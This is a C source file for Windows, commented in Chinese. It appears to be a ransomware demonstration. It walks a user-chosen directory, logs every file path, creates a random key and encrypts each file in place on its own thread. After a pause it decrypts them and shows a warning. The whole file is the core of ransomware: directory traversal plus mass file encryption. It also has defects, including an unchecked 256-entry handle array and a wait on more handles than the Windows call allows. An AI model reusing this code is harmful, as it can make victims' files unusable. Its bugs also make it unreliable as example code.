#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>
#include "search_file.h"
#include "encode.h"
#include "random_key.h"
#include "warning.h"

#define MAX_LINE_LENGTH 256

// 定义线程参数结构体
typedef struct {
    uint8_t *key;
    char *filename;
} thread_args;

// 线程函数，用于加密指定文件
DWORD WINAPI encrypt_file(LPVOID lpParameter)
{
    thread_args *t_args = (thread_args *)lpParameter;

    // 加密文件
    printf("正在加密文件 %s\n", t_args->filename);
    encode(t_args->filename, t_args->key);

    free(t_args->filename);
    free(t_args);
    return 0;
}

// 线程函数，用于解密指定文件
DWORD WINAPI decrypt_file(LPVOID lpParameter)
{
    thread_args *t_args = (thread_args *)lpParameter;

    // 解密文件
    printf("正在解密文件 %s\n", t_args->filename);
    decode(t_args->filename, t_args->key);

    free(t_args->filename);
    free(t_args);
    return 0;
}

int main()
{
    // 遍历目录并将文件路径写入output.txt
    TCHAR input[MAX_PATH];
    printf("输入想要遍历的目录。如：C:\\\\windows 或 C:\\\\Documents and Settings\n");
    scanf("%s", input);
    FILE *fp = fopen("output.txt", "wb");
    if (!fp)
    {
        printf("无法打开文件\n");
        return 1;
    }
    findFile(input, fp);
    fclose(fp);

    // 生成随机密钥
    uint8_t *key = random_key();

    // 读取output.txt中的文件路径，创建线程进行加密操作
    fp = fopen("output.txt", "rb");
    if (!fp)
    {
        printf("无法打开文件\n");
        free(key);
        return 1;
    }

    char line[MAX_LINE_LENGTH];
    HANDLE encrypt_threads[MAX_LINE_LENGTH];
    int num_encrypt_threads = 0;

    while (fgets(line, MAX_LINE_LENGTH, fp))
    {
        // 去掉行末的换行符
        int len = strlen(line);
        if (line[len - 1] == '\n')
        {
            line[len - 1] = '\0';
        }

        // 创建线程进行加密操作
        thread_args *t_args = (thread_args *)malloc(sizeof(thread_args));
        t_args->key = key;
        t_args->filename = (char *)malloc(sizeof(char) * (len + 1));
        strcpy(t_args->filename, line);

        HANDLE thread_handle = CreateThread(NULL, 0, encrypt_file, (LPVOID)t_args, 0, NULL);
        if (thread_handle == NULL)
        {
            printf("无法创建线程\n");
            free(t_args->filename);
            free(t_args);
        }
        else
        {
            encrypt_threads[num_encrypt_threads] = thread_handle;
            num_encrypt_threads++;
        }
    }

    fclose(fp);

    // 等待所有加密线程结束
    WaitForMultipleObjects(num_encrypt_threads, encrypt_threads, TRUE, INFINITE);

    

    system("pause");

    // 读取output.txt中的文件路径，创建线程进行解密操作
    fp = fopen("output.txt", "rb");
    if (!fp)
    {
        printf("无法打开文件\n");
        free(key);
        return 1;
    }

    HANDLE decrypt_threads[MAX_LINE_LENGTH];
    int num_decrypt_threads = 0;

    while (fgets(line, MAX_LINE_LENGTH, fp))
    {
        // 去掉行末的换行符
        int len = strlen(line);
        if (line[len - 1] == '\n')
        {
            line[len - 1] = '\0';
        }

        // 创建线程进行解密操作
        thread_args *t_args = (thread_args *)malloc(sizeof(thread_args));
        t_args->key = key;
        t_args->filename = (char *)malloc(sizeof(char) * (len + 1));
        strcpy(t_args->filename, line);

        HANDLE thread_handle = CreateThread(NULL, 0, decrypt_file, (LPVOID)t_args, 0, NULL);
        if (thread_handle == NULL)
        {
            printf("无法创建线程\n");
            free(t_args->filename);
            free(t_args);
        }
        else
        {
            decrypt_threads[num_decrypt_threads] = thread_handle;
            num_decrypt_threads++;
        }
    }

    fclose(fp);

    // 等待所有解密线程结束
    WaitForMultipleObjects(num_decrypt_threads, decrypt_threads, TRUE, INFINITE);

    free(key);
    
    pop_warning();

    system("pause");

    return 0;
}